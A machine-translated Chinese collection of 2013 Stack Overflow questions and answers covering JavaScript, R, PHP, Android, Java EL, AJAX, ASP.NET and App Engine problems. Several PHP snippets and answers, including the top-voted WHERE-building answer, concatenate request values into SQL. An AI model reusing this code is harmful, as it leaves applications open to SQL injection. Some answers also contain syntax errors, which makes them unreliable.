我正在尝试使用 luhn 算法编写信用卡验证脚本，但我什至无法正确操作字符串输入以使自己开始。只是试图从字符串中取出连字符和空格，但它一直在调试器中说我的函数没有替换方法？我不是程序员，只是想通过这门课.....

这是我的代码，其中可能有一两行用于测试目的，但我忘记删除了。

```
<script type="text/javascript">

  function fixString(){

    //get credit card number
    var ccNumber = document.getElementById("ccNumber");

    //remove hyphens and spaces
    var ccNumber = ccNumber.replace(/-/g, "");
        //.replace(/\n/g, "");

    show.innerHTML = ccNumber.value;

  }

</script>

 <body>
<form action="#">
  <p><label>Enter credit card number here:<input id="ccNumber" type="text">
    </label> <input value="Validate" onclick="fixString()" type="button"> </p>
</form>
<p id="show"></p>

</body> 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-05T03:31:54.700

您绝对有正确的想法并且走在正确的轨道上！

```
var ccNumber = document.getElementById("ccNumber"); 
```

这只是获取*元素*。它没有得到*价值*。

你要这个。

```
var ccNumber = document.getElementById("ccNumber").value; 
```

然后在这里，，`show.innerHTML = ccNumber.value;`删除，`.value`因为`ccNumber`是字符串。

# r - 绘制时间序列数据矩阵中的点向量

> ID：15825456
> 
> 赞同：1
> 
> 时间：2013-04-05T03:31:03.210
> 
> 标签：r, time-series

我有一个 100*8 的数据矩阵，其中每一行是 8 个不同时间点的值向量。我很想知道如何在 R 中绘制以下矩阵以使图形与下面的图形非常相似：

![在此处输入图像描述](https://i.stack.imgur.com/7T9ni.png)

这是我的数据矩阵的示例。

```
 1    2        3     4    5    6    7      8
line1     0.22  0.075  0.35  0.89   0   0.35  0.42  2.34   
line2      0    0.47   0.89  2.51   0   0.36  1.14  2.09
line3     1.22  0.075  0.35  0.89   0   0.35  0.42  1.34
line4     2.22  0.75   0.45  0.99   0   0.54  0.24  2.34
line5     3.22  0.275  0.55  0.819  0   0.25  0.34  2.34 
```

任何帮助或建议将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-05T03:41:49.227

试试`matplot()`。默认情况下，它将列视为系列，因此我们需要`t()`在使用前转置 ( ) 数据框。这是使用您提供的数据子集的示例

```
timeser <- read.table(text = "           1    2        3     4    5    6    7      8
line1     0.22  0.075  0.35  0.89   0   0.35  0.42  2.34   
line2      0    0.47   0.89  2.51   0   0.36  1.14  2.09
line3     1.22  0.075  0.35  0.89   0   0.35  0.42  1.34
line4     2.22  0.75   0.45  0.99   0   0.54  0.24  2.34
line5     3.22  0.275  0.55  0.819  0   0.25  0.34  2.34", header = TRUE)

matplot(t(timeser), type = "l") 
```

生产

![在此处输入图像描述](https://i.stack.imgur.com/OPKeO.png)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-05T03:44:40.720

您可以将对象转换为`zoo`对象，然后用于`plot.zoo`获得所需的情节。 `zoo`是一个时间序列类。

```
> mat
       X1    X2   X3    X4 X5   X6   X7   X8
[1,] 0.22 0.075 0.35 0.890  0 0.35 0.42 2.34
[2,] 0.00 0.470 0.89 2.510  0 0.36 1.14 2.09
[3,] 1.22 0.075 0.35 0.890  0 0.35 0.42 1.34
[4,] 2.22 0.750 0.45 0.990  0 0.54 0.24 2.34
[5,] 3.22 0.275 0.55 0.819  0 0.25 0.34 2.34

> plot.zoo(zoo(t(mat), order.by=1:ncol(mat)), screens = 1, col = rainbow(ncol(t(mat))), ylab="Data") 
```

这会给

![在此处输入图像描述](https://i.stack.imgur.com/KQvlY.png)

# php - 从数组中提交随机字符串，在回显字符串后提交字符串

> ID：15825458
> 
> 赞同：0
> 
> 时间：2013-04-05T03:31:06.183
> 
> 标签：php, phpmyadmin

每次我单击提交元素的名称时，我都会对在输入数据库时​​显示在当前回显元素之后的元素的更改进行投票。对于如何解决这个问题，有任何的建议吗？我似乎无法弄清楚。

可以说，回显显示了表单中的值的 example2。我单击 example2 但 example1 保存在数据库中。我不知道如何解决这个问题。谢谢您的帮助。

这是我的代码：

我正在使用的阵列设置：

```
$array = array("example1","example2","example3");
$random = $array;
shuffle($random);

<?php echo array_pop($random);?> 
```

PHP：动作

我在表单中使用 POST 方法。

```
$mysqli = new mysqli("", "", "", "");
if ($mysqli->connect_error) {
    echo "Failed to connect to MySQL: (" . $mysqli->connect_error . ") " . $mysqli->connect_error;
}
if (!$mysqli->query("INSERT INTO table(id, name, votes) VALUES (id, '".$random."', '".$votes."')")) {
    echo "Multi-INSERT failed: (" . $mysqli->errno . ") " . $mysqli->error;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T03:57:59.600

```
if (!$stmt->bind_param("s", $id, $votes)) 
```

应该

```
if (!$stmt->bind_param("ss", $id, $votes)) because the number of strings and variables have to match. 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:04:01.790

为了使您的问题清楚，我相信您想要以下内容：

*   从数组中取出一个随机元素。
*   在网页中显示它。
*   将其插入数据库

所以，

```
$array = array("example1","example2","example3");
shuffle($array);
$element = array_pop($array);    
echo $element; 
```

然后插入`$element`数据库。

上面做你想做的。您的其余代码没有任何意义。

# android - 为什么 onSurfaceCreated 从未在此代码中运行？

> ID：15825461
> 
> 赞同：0
> 
> 时间：2013-04-05T03:31:25.250
> 
> 标签：android, opengl-es

我在我的活动中以这种方式创建我的游戏元素：

```
public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  mGame = new Game(this);
  mGame.bootstrap();
  setContentView(CommonObject.sCommonParams.touch);
  mGame.loadTextures();
} 
```

然后在我的引导程序中，我以这种方式创建我的 GLsurfaceView：（callingActivity 是我在创建 mGame 时传递的 this）

```
CommonObject.sCommonParams.openGLView = new GLSurfaceView(callingActivity);
CommonObject.sCommonParams.openGLView.setRenderer(new GameRenderer());
CommonObject.sCommonParams.openGLView.setRenderMode(GLSurfaceView.RENDERMODE_WHEN_DIRTY); 
```

是因为我将 GLSurfaceView 传递给它不起作用的静态对象吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T06:20:36.747

原来我不得不

```
setContentView(CommonObject.sCommonParams.openGLView); 
```

让 onSurfaceCreated 运行。这是可悲的，因为我试图避免这样做。

# android-tabhost - TabActivity 和 getTabHost() 在我的 Eclipse 中不起作用。如何解决这些问题？

> ID：15825466
> 
> 赞同：0
> 
> 时间：2013-04-05T03:32:07.037
> 
> 标签：android-tabhost, tabactivity

## 这是我的代码

这里有一些问题

1.  为什么 TabActivity 在我的日食中是划痕的？
2.  getTabHost() 出现错误？任何人都可以修复此代码吗？

我会尝试从 androidhive.com 学习，然后我看到了这个教程，但是当我在 eclipse 中编写它时，它失败了。

```
package com.uavero.androidtablayout;
import android.os.Bundle;
import android.app.TabActivity;
import android.content.Intent;
import android.view.Menu;
import android.widget.TabHost;
import android.widget.TabHost.TabSpec;

public class TabLayout extends TabActivity{
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_tab_layout);

    TabHost tabHost = getTabHost();

    // Tab for Photos
    TabSpec photospec = tabHost.newTabSpec("Photos");
    // setting Title and Icon for the Tab
    photospec.setIndicator("Photos", getResources().getDrawable(R.drawable.icon_photo_tab));
    Intent photosIntent = new Intent(this, PhotosActivity.class);
    photospec.setContent(photosIntent);

    // Tab for Songs
    TabSpec songspec = tabHost.newTabSpec("Songs");
    songspec.setIndicator("Songs", getResources().getDrawable(R.drawable.icon_song_tab));
    Intent songsIntent = new Intent(this, SongsActivity.class);
    songspec.setContent(songsIntent);

    // Tab for Videos
    TabSpec videospec = tabHost.newTabSpec("Videos");
    videospec.setIndicator("Videos", getResources().getDrawable(R.drawable.icon_video_tab));
    Intent videosIntent = new Intent(this, VideosActivity.class);
    videospec.setContent(videosIntent);

    // Adding all TabSpec to TabHost
    tabHost.addTab(photospec); // Adding photos tab
    tabHost.addTab(songspec); // Adding songs tab
    tabHost.addTab(videospec); // Adding videos tab
      }

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_tab_layout, menu);
    return true;
          }

     } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:42:53.797

我可以解决这个问题。Android 3.0 和高级版本不支持 TabActivity，或者如果您使用的是较低版本并且仍然出现错误，则更改这行代码；- TabHost tabHost = getTabHost();、import.app.TabActivity 和 TabHost tabHost = ( TabHost）findViewById（R.id.tabhost）。

# java - Java EL 中的动态代理

> ID：15825474
> 
> 赞同：3
> 
> 时间：2013-04-05T03:33:24.353
> 
> 标签：java, jsp, jakarta-ee, javabeans, el

**编辑：我缩小了问题范围并在[此处](https://stackoverflow.com/questions/15847458/google-app-engine-jetty-introspection-fails-for-dynamic-proxy)发布了相关问题。请检查一下！**

我正在尝试使用动态代理来简化 HTML 表单处理。我正在使用 Google App Engine 上的 JSP 使用非常简单的 MVC 设置（没有花哨的框架）。我不断收到以下异常：

```
javax.el.PropertyNotFoundException: Could not find property testValue in class com.sun.proxy.$Proxy7
    at javax.el.BeanELResolver.toBeanProperty(BeanELResolver.java:430)
    at javax.el.BeanELResolver.getValue(BeanELResolver.java:290)
    at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:231)
    at org.apache.el.parser.AstValue.getValue(AstValue.java:123)
    at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:186)
    ... 
```

好的，这里是代码。首先，我代理的接口：

```
public interface MyForm {
      public String getTestValue();
} 
```

接下来，创建代理的代码：

```
// imports omitted

public final class Forms {

    private Forms() { }

    public static <T> T fromRequest(
            final Class<T> klass,
            final HttpServletRequest request) {

        Object proxy = Proxy.newProxyInstance(
                klass.getClassLoader(),
                new Class<?>[]{ klass },
                new InvocationHandler() {
                    @Override public Object invoke(
                            Object proxy,
                            Method method,
                            Object[] args) throws Throwable {

                        return "Will this be returned?";
                    }
                });
        return (T)proxy;
    }
} 
```

接下来是“动作”类：

```
// imports omitted

public class MyAction extends Action {

    // Called by the controller, which forwards to the returned JSP
    public String perform(HttpServletRequest request) throws Exception {

        final MyForm form = Forms.fromRequest(MyForm.class, request);
        request.setAttribute("form", form);
        return "view.jsp";
    }
} 
```

最后，JSP：

```
<html>
    <body>
        <div>${ form.testValue }</div>
    </body>
</html> 
```

如您所见，我实际上还没有进行任何表单处理。首先，我只想用动态代理实现概念证明。如前所述，上面的代码不起作用。然而，令人困惑的是，如果我将请求属性设置为一个简单地转发到代理的匿名类，它确实有效！因此，以下更改修复了它：

```
request.setAttribute("form", new MyForm() {
    @Override getTestValue() { return form.getTestValue(); }
}); 
```

但是，必须匿名子类化接口类型违背了代理的目的。有人可以告诉我发生了什么吗？

# php - 从输入 javascript 的邮政编码中获取城市和州

> ID：15825475
> 
> 赞同：0
> 
> 时间：2013-04-05T03:33:31.270
> 
> 标签：php, javascript, jquery, ajax

我有一个现有的数据库，其中包含城市、州、邮编、纬度、经度、县：40,000 多条记录。

我可以毫无问题地使用它。

我现在要做的是，当用户在表单中输入邮政编码时，查询数据库并获取相关的城市、州、纬度、经度和县。

该脚本执行“ONBLUR”但没有任何反应。我验证了我正在正确调用该函数，因为我插入了一个`window.alert("Test")`.

这是javascript：

```
function updateCityState()
   {
   {
    var zipValue = document.getElementById('zipcode').value;
    if(zipValue!="")
    {
        var url = "admin/includes/zip_check.php";
        var param = "?zip=" + escape(zipValue);

        var ajax = getHTTPObject();

        ajax.open("GET", url + param, true);
        ajax.onreadystatechange = handleAjax;
        ajax.send(null);
    }
}
}
 function handleAjax()
{
if (ajax.readyState == 4)
{
    citystatearr = ajax.responseText.split(",");

    var city = document.getElementById('city');
    var state = document.getElementById('state');

    city.value = citystatearr[0];
    state.value = citystatearr[1];
}
 } 
```

我的“zip_check.php”文件看起来像这样......当我手动查询 zip_check 时......

```
include_once("../db.php");
$query = "SELECT * FROM `cities_extended` WHERE `zip`=".mysql_real_escape_string($_GET['zip']);
$result = mysql_query($query) or die(mysql_error());

$row = mysql_fetch_array($result);
echo $row['city'].",".$row['state_code']; 
```

我是否需要包含 JQuery 之类的东西或我缺少的其他东西才能使它工作？我的语法正确吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T03:50:38.250

正如@elclanrs 所说，您在`function updateCityState()`. 其次，你从服务器端发回什么样的数据类型？json、xml、text 或 html，这些信息非常重要，您必须谨慎使用。通过实现 AJAX 方法而不是通过 jQuery 等库使用它，您必须确保正确定义响应数据类型、处理响应状态并与多个浏览器兼容。下面的代码片段是一个示例：

```
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  } 
```

以这种方式调试并不容易，如果您仍想保留此实现，可以参考[this](http://www.w3schools.com/ajax/ajax_aspphp.asp)。就个人而言，我建议您使用 jQuery 来开展业务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:46:03.393

考虑使用 jQuery.ajax 函数，它可以为您完成所有艰苦的工作！请参阅官方 API 文档：[http](http://api.jquery.com/jQuery.ajax/) ://api.jquery.com/jQuery.ajax/ 。您的 jQuery 代码可能如下所示：

```
function updateCityState()
{
    var zipValue = $('#zipcode').val();
    if(zipValue == "")
    {
        alert('enter a zip value!');
    }
    else
    {
        //process ajax request
        var zipcodeRequest = $.ajax({
             type: "GET",
             url: "admin/includes/zip_check.php",
             data: { zip:zipValue }
        });

        zipcodeRequest.done(function(data)
        {
             alert( "You have successfully found your zip code." + data );
             //do something with your data here...
             $('#city').val(data.city);
             $('#state').val(data.state);
        });

        zipcodeRequest.fail(function(jqXHR, textStatus)
        {
             alert( "We could not find your zip code (" + textStatus + ")." );
        });
    }
} 
```

这里有一些更多的 ajax 代码示例可以帮助您弄清楚：

1.  [http://www.jquery4u.com/demos/ajax/](http://www.jquery4u.com/demos/ajax/)
2.  [http://www.jquery4u.com/function-demos/ajax/](http://www.jquery4u.com/function-demos/ajax/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:31:34.703

如果您不想使用 jquery，请尝试使用它，它的简单 ajax 但与您的实现不同

```
function updateCityState()
{
var xmlhttp;
var zipValue = document.getElementById('zipcode').value;  
if (zipValue=="")
  {
    var city = document.getElementById('city');
    var state = document.getElementById('state');

    city.value = "";
    state.value = "";
  return;
  }
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    citystatearr = xmlhttp.responseText.split(",");

    var city = document.getElementById('city');
    var state = document.getElementById('state');

    city.value = citystatearr[0];
    state.value = citystatearr[1];
    }
  }

xmlhttp.open("GET","admin/includes/zip_check.php?zip="+zipValue,true);
xmlhttp.send();
} 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-05T03:41:24.960

尝试使用您的 php 文件的确切路径。

```
var url = "admin/includes/zip_check.php"; 
```

类似于：

```
var url = "http://mysite.com/admin/includes/zip_check.php"; 
```

# ios - IOS自定义标签应用方式

> ID：15825478
> 
> 赞同：0
> 
> 时间：2013-04-05T03:33:57.273
> 
> 标签：ios, uitableview

我是 IOS 新手，我需要复制我为 Android 制作的应用程序。基本上是一个动态的选项卡式应用程序，一开始只显示 2 个固定尺寸的选项卡（2 个开始选项卡不能填满屏幕宽度），然后每次用户按下主页选项卡上的按钮时，都会显示一个带有网络视图的新选项卡添加内容。webview 选项卡也可以动态关闭，它们必须从选项卡控制器中消失。此外，2 个第一个固定选项卡之后的区域必须可以水平滚动，以便用户可以看到所有存在的 web 视图选项卡。

在 Android 上，我没有使用内置的选项卡导航，但我使用片段进行了自定义导航。

如果您能告诉我在 IOS 上做同样事情的最佳方法，我将不胜感激。

提前致谢。

PS我会附上一些图片更清楚。

一开始就申请 ![一开始就申请](https://i.stack.imgur.com/8ObdP.png)

添加了一个标签 ![添加了一个标签](https://i.stack.imgur.com/HXTe6.png)

很多标签，用户可以滚动查看它们 ![很多标签，用户可以滚动查看它们](https://i.stack.imgur.com/SqADf.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:43:36.330

[CocoaControls](http://www.cocoacontrols.com)是您的朋友。看看[这个控件](http://www.cocoacontrols.com/controls/altabsview)，它似乎可以做你想做的事。这是一种商业产品，但如果能节省您的时间，19 美元似乎不是很多钱……

# python - 如何测试函数是否正常运行或返回特定值

> ID：15825479
> 
> 赞同：1
> 
> 时间：2013-04-05T03:33:57.817
> 
> 标签：python, unit-testing

我只需要测试函数是否运行没有失败或测试返回的值是否是以下之一：

```
('NDP', None) or ('CPC', None) or ('GREEN', None) or ('LIBERAL', None) 
```

* * *

```
def test_single_zero_ballot(self):
    self.assertEqual(voting_systems.voting_irv({('NDP','CPC','LIBERAL','GREEN'):0}),
                     (('NDP', None) or ('CPC', None) or ('GREEN', None) or ('LIBERAL', None)),
    'Fails to run when there is a single ballot with zero votes') 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T03:45:12.863

我建议使用`assertIn`，因为您正在检查该值是否是几个值之一：

```
def test_single_zero_ballot(self):
    valid_values = [('NDP', None), ('CPC', None), ('GREEN', None), ('LIBERAL', None)]    
    self.assertIn(voting_systems.voting_irv({('NDP','CPC','LIBERAL','GREEN'):0}),
                     valid_values,
    'Fails to run when there is a single ballot with zero votes') 
```

有关完整详细信息，请参阅[文档](http://docs.python.org/2/library/unittest.html#unittest.TestCase.assertIn)。

# terminal - 创建 Xquery 命令时放置错误的 ()

> ID：15825492
> 
> 赞同：1
> 
> 时间：2013-04-05T03:36:10.470
> 
> 标签：terminal, command, xquery, helpers, docbook

所以我从 W3schools 创建了相同的 books.xml 文件。现在我正在尝试使用 Xquery。

我从这个命令开始： `doc("books.xml")`

但它显示以下错误：

> 错误地放置 () 的。

我必须使用这个查询：`doc("books.xml")/bookstore/book/title` 但我得到了同样的错误

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-06-24T17:03:27.897

> 我发现了错误，我上传到我的 gl 的撒克逊文件没有正确上传。我的意思是它是 3.9 MB，但在 gl 上它是 0 大小！所以它现在工作得很好

# c# - 在 RedirectToAction 中传递对象

> ID：15825499
> 
> 赞同：1
> 
> 时间：2013-04-05T03:37:56.437
> 
> 标签：c#, asp.net-mvc-4

我有一个控制器，它收到了一个 POST 回复，并且已经处理了用户请求的内容。然后我构建一个对象，现在，想要 RedirectToAction..

```
return RedirectToAction() ("Index", "Location", r); 
```

其中 r 是我正在使用的命名良好的对象。但在目标动作上，r 为空。

```
public ActionResult Index(LocationByAddressReply location) 
```

现在，我在这里阅读了一些关于此的帖子，但我正在努力理解。

提出的一个选项是L

```
TempData["myObject"] = myObject; 
```

但这似乎……很奇怪。不是类型安全的。这是传递对象最合适的方式吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T04:44:15.980

您可以通过两种方式做到这一点：

**第一个选项**，如果你有一个简单的模型

```
return RedirectToAction("Index", "Location", new { Id = 5, LocationName = "some place nice" }); 
```

那个需要维护，考虑以后是否需要向模型添加属性。因此，您可以花哨并这样做：

**第二种选择**，`UrlHelper`是你的朋友

```
return Redirect(Url.Action("Index", "Location", model)); 
```

第二种选择确实是正确的做法。`model`是您构建并希望传递给您的`LocationController`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T04:23:19.943

是的，您可以使用`TempData`重定向获取值。您的方法应如下所示：

```
public ActionResult YourRedirectMethod()

{
   TempData["myObject"]=r;
   return RedirectToAction() ("Index", "Location");

} 
```

和

```
public ActionResult Index()
{
   LocationByAddressReply location=null;
   if(TempData["myObject"]!=null)
    {
          location=(LocationByAddressReply)TempData["myObject"];
    }
} 
```

通过这种方式，您可以获得先前在重定向方法上设置的模型值。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T04:50:31.270

我不认为 using`TempData`是正确的解决方案，请参阅[此答案](https://stackoverflow.com/questions/386681/asp-net-mvc-tempdata-good-or-bad-practice#answer-393112)。相反，您可以传递一个由您的对象组成的匿名`r`对象。例如，如果你有这个：

```
public class UserViewModel 
{
    public int Id { get; set; }
    public string ReturnUrl { get; set; }
}

public ActionResult Index(UserViewModel uvm) 
{ 
    ...
} 
```

你可以这样传递`UserViewModel`：

```
public ActionResult YourOtherAction(...)
{
    ...
    return RedirectToAction("Index", "Location", new 
                                                 { 
                                                     id = /*first field*/,
                                                     returnUrl = /*second field*/ 
                                                 });
} 
```

ASP.NET MVC 将其解析为您期望的对象作为`Index`实际参数。如果您还没有切换代码以使用`TempData`.

# php - 在 PHP 中创建变量

> ID：15825501
> 
> 赞同：-2
> 
> 时间：2013-04-05T03:38:08.047
> 
> 标签：php

您好我正在尝试创建一个由变量存储的字符串，其值由 URL 中的值确定。但是，我不确定如何去做。我不断收到错误“意外的 T_IF”。我可能做错了什么？

谢谢

PHP：

```
 $where=  

            if (isset($_GET['name'])) {
                echo "name=" . $name;
            }
            if (isset($_GET['number'])) {
                echo " AND number=" . $number;
            }
            if (isset($_GET['address'])) {
                echo " AND address=" . $address;
            }
            if (isset($_GET['city'])) {
                echo " AND city=" . $city;
            }
            if (isset($_GET['state'])) {
                echo " AND state=" . $state;
            }
            if (isset($_GET['zip'])) {
                echo " AND zip=" . $zip;
            }
            if (isset($_GET['color'])) {
                echo " AND color=" . $color;
            }
        ; 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-05T03:40:44.733

我会简化一下。

```
$whereElements = array();
foreach ($_GET as $key=>$value) {
    $whereElements[] = $key . '=' . $value;
}
$where = implode(' AND ', $whereElements); 
```

如果您不想要所有变量，则可以始终将其列入白名单/提供要过滤的键数组。此外，如果您在 SQL 或其他上下文中使用它，您应该真正使用准备好的查询，因为这将对 SQL 注入开放。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T03:41:22.753

尝试

```
 $where=""; 

            if (isset($_GET['name'])) {
                $where .= "name=" . $name;
            }
            if (isset($_GET['number'])) {
                $where .= " AND number=" . $number;
            }
            if (isset($_GET['address'])) {
                where .= " AND address=" . $address;
            }
            if (isset($_GET['city'])) {
                where .= " AND city=" . $city;
            }
            if (isset($_GET['state'])) {
                $where .= " AND state=" . $state;
            }
            if (isset($_GET['zip'])) {
                $where .= " AND zip=" . $zip;
            }
            if (isset($_GET['color'])) {
                $where .= " AND color=" . $color;
            }
echo $where; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T03:41:12.527

你不能像这样声明 PHP 变量。你必须连接变量。

```
<?php
$where = '';
if (isset($_GET['name'])) {
    $where .= " name=" . $name;
}
if (isset($_GET['number'])) {
    $where .= " AND number=" . $number;
}
if (isset($_GET['address'])) {
    $where .= " AND address=" . $address;
}
if (isset($_GET['city'])) {
    $where .= " AND city=" . $city;
}
if (isset($_GET['state'])) {
    $where .= " AND state=" . $state;
}
if (isset($_GET['zip'])) {
    $where .= " AND zip=" . $zip;
}
if (isset($_GET['color'])) {
    $where .= " AND color=" . $color;
}
echo $where;
?> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T03:39:24.740

用这个：

```
if (isset($_GET['name'])) {
    $where .= "name=" . $name;
}
if (isset($_GET['number'])) {
    $where .= " AND number=" . $number;
}
if (isset($_GET['address'])) {
    $where .= " AND address=" . $address;
}
if (isset($_GET['city'])) {
    $where .= " AND city=" . $city;
}
if (isset($_GET['state'])) {
    $where .= " AND state=" . $state;
}
if (isset($_GET['zip'])) {
    $where .= " AND zip=" . $zip;
}
if (isset($_GET['color'])) {
    $where .= " AND color=" . $color;
} 
```

基本上，`.=`告诉 PHP 将值附加到`=`变量中已经存在的值的末尾。

在您的问题中，您使用`echo`错误。`echo`只是意味着在页面上写下后面的内容，而不是将后面的内容分配给变量。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-05T03:40:28.027

尝试

```
$where=""; 
```

进而

```
if (isset($_GET['name'])) {
    $where .= "name=" . $name;
}
if (isset($_GET['number'])) {
    $where .= " AND number=" . $number;
}
if (isset($_GET['address'])) {
    $where .= " AND address=" . $address;
} 
```

等等。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-05T04:36:15.973

要么你启用了 register_globals（这是邪恶的！），要么你的代码永远不会工作。

```
$where= 
```

在这里，您开始了一项任务，...

```
if (isset($_GET['name'])) {
    echo "name=" . $name;
} 
```

`if`...并用一个语句打断它。这就是 PHP 抱怨的原因。

下一个问题是您检查一个变量 ( `$_GET['name']`) 的存在，然后使用另一个变量 ( `$name`)。

此外，您显然是在尝试构建（部分）SQL 查询而不保护您的数据库不被黑客入侵。

因此，为了简化您的代码并使其更安全，请将其更改为

```
// $mysqli = new mysqli("localhost", "my_user", "my_password", "my_database");

$properties = array('number', 'address', 'city', 'state', 'zip', 'color');
$conditions = array();
foreach ($properties as $property) {
    if (!empty($_GET[$property])) {
        $conditions[] = sprintf("`%s`='%s'", $property, $mysqli->real_escape_string($_GET[$property]));
    }
}
$where = implode(' AND ', $conditions); 
```

# python - 我的频道 api 代码有什么问题？

> ID：15825504
> 
> 赞同：0
> 
> 时间：2013-04-05T03:38:13.867
> 
> 标签：python, google-app-engine, channel-api

我一直在努力与 GAE 和频道 api 一起建立一个网站，以显示和处理来自我正在研究的机器人的实时数据。我对 web 开发和一般的 python 还很陌生，但在我看来，这段代码应该可以工作，一旦我开始工作（将数据记录到数据库、实际数据处理等），我会让它变得更花哨，但现在我只希望它显示从机器人上的互联网连接板发送的发布请求中变量“val”的最新出现。希望这对任何希望使用通道 api 进行实时数据显示的人有所帮助。

现在我正在显示一个带有输入框的模板，用于向页面发送发布请求。然而，我没有用提交时的当前值更新首页，而是得到一个空白屏幕。我不确定我的问题是否与通道 api 代码或用于更新显示值的 java 函数有关。

Python代码：

```
import os
import webapp2
import jinja2
import json
import logging
from google.appengine.ext import db
from google.appengine.api import channel
from google.appengine.api import users

template_dir = os.path.join(os.path.dirname(__file__), 'templates')
jinja_env = jinja2.Environment(loader = jinja2.FileSystemLoader(template_dir), autoescape=True)

channels = []

class MainPage(webapp2.RequestHandler):

    def get(self):

        user = users.get_current_user()
        if not user:
          self.redirect(users.create_login_url(self.request.uri))
          return

        nickname = user.nickname()
        clientid = user.user_id()
        channel_token = channel.create_channel(clientid)
        channels.append(channel_token)

        template_values = {'channel_id': channel_token, 'nickname': nickname}

        template = jinja_env.get_template('front.html')
        self.response.out.write(template.render(template_values))

    def post(self):
        value = self.request.get("value")

        if value:
        jsn = json.dumps({"val": value})
        for i in range(len(channels)):
            channel.send_message(channels[i], jsn)

app = webapp2.WSGIApplication([
    ('/', MainPage)
], debug=True) 
```

HTML模板的相关部分：

```
 <form method="post">
        <label>
            <div>Title</div> <input type="text" name="value" value="{{value}}">
        </label>
        <br>
        <input type="submit">

        <div class="error">{{error}}</div>
    </form>

    <hr>

    <script>
        onMessage = function myFunction(message)
        {
        document.getElementById("val").innerHTML=message;
        }
        var token = '{{ channel_id }}';
        var channel = new goog.appengine.Channel(token);
        var socket = channel.open();
        socket.onmessage = onMessage(message.val);

    </script>

    <p id="val">No value to display</p>

</body> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T13:57:47.560

在您分配 socket.onmessage 的 javascript 行中：

```
 socket.onmessage = onMessage(message.val); 
```

您正在做的是将调用结果分配给 onMessage() 函数。相反，只需将函数本身分配给 socket.onmessage，如下所示：

```
 socket.onmessage = onMessage; 
```

同样在您的 onMessage 处理程序中，用于`message.data`获取您传入的 JSON 值。要获取`val`您需要 JSON decode 的字段`message.data`。

# android - 创建它们的第一个实例后如何从一个 Activity 移动到另一个？

> ID：15825515
> 
> 赞同：0
> 
> 时间：2013-04-05T03:40:34.357
> 
> 标签：android

我有`MainActivity.java`，我想从中打开`Activity A`。

假设我`Activity` `A`从 开始`MainActivity`，我将使用以下代码：

```
Intent i = new Intent(this,A.class);
startActivity(i); 
```

当我在活动 A 中时，我按下后退按钮。后退按钮将完成**Activity A**并返回**MainActivity**。因此，如果我重新启动**Activity A**，它将从头开始重新启动。这不是我想要的。我只想从**Activity A**创建一个实例，所以如果我从**A**移动到**MainActivity**多次，它将不会重新启动，它将保持最后一个状态。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:15:09.687

**当 MainActiivty 启动另一个时，新活动 Activity A 被推到堆栈顶部并获得焦点**。**前一个活动仍保留在堆栈中，但已停止**。**当活动停止时，系统会保留其用户界面的当前状态。**

当用户按下后退按钮时，当前活动**从栈顶弹出（活动被销毁）并恢复前一个活动（其 UI 的先前状态被恢复）**。堆栈中的 Activity 永远不会重新排列，只会从堆栈中压入和弹出——当当前 Activity 启动时将其压入堆栈，并在用户使用“后退”按钮离开时弹出。因此，后堆栈作为“后进先出”对象结构运行。

注意：可以同时在后台执行多个任务。但是，如果用户同时运行多个后台任务，系统可能会开始销毁后台活动以恢复内存，从而导致活动状态丢失。

在您的 MainActivity 到 Activity A 并按回 Button ， Activity A 从堆栈中弹出并销毁。

再次从 MainActivty 导航到 A，活动被重新创建，因为它被破坏了。这就是它的工作原理。

有关更多详细信息，请查看以下链接中的后堆栈。

[http://developer.android.com/guide/components/tasks-and-back-stack.html](http://developer.android.com/guide/components/tasks-and-back-stack.html)

```
 android:launchMode 
```

关于如何启动活动的说明。有四种模式与 Intent 对象中的活动标志（FLAG_ACTIVITY_* 常量）一起工作，以确定当调用活动来处理意图时应该发生什么。

他们是：

1.  标准
2.  单顶
